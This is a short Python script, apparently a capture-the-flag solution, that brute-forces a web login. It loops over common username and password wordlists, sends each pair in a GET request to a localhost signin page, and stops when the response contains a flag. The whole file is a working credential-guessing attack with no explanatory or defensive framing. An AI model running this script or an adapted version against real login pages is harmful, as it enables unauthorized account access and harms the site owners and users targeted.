import requests

def brute_force_attack(usernames, passwords):
    """
    Simulates a brute force attack by trying all combinations of usernames and passwords.
    """
    for username in usernames:
        for password in passwords:
            print(f"Trying username: {username}, password: {password}")
            url = f"http://localhost/index.php?page=signin&username={username}&password={password}&Login=Login#"
            res = requests.get(url)
            if "FLAG" in res.text or "flag" in res.text:
                print(f"Success!")
                exit(0)
            

if __name__ == "__main__":
    with open("common_usernames.txt", "r") as f:
        usernames = f.read().splitlines()
    with open("common_passwords_1000.txt", "r") as f:
        passwords = f.read().splitlines()
    brute_force_attack(usernames, passwords)
